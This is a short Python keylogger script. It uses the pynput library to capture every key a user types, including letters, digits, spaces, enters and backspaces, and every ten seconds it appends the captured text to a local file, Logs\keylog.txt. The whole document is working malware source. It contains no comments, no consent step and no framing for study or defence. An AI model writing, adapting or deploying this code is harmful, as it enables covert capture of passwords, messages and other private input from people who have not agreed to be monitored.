import os,sys
from pynput.keyboard import Listener, Key
import time
cd = os.path.abspath(sys.argv[0])
cd = cd.rsplit("\\", 1)
path = cd[0] + "\\Logs\\keylog.txt"
print(path)
keys = []
t = time.time()
last = time.time()

def on_press(key):
    global keys
    global last
    if key == Key.backspace:
        keys = keys[:-1]
    if key == Key.enter:
        keys.append("\n")
    if key == Key.space:
        keys.append(" ")
    if hasattr(key, 'char') and key.char.isalnum():
        if str(key).count("'") > 2:
            keys.append(str("'"))
        else:
            keys.append(str(key).replace("'", ""))
    last = time.time()


    
listener = Listener(on_press=on_press)
x = 1
for i in range(1,100):
    x += i*2
listener.start()

while True:
    if int(time.time()) - t >= 10 and int(time.time() - last) > 5:
        with open(path, 'a') as f:
            k = "".join(keys)
            f.write(k)
            f.close()
            keys = []
            t = time.time()
    else:
        pass

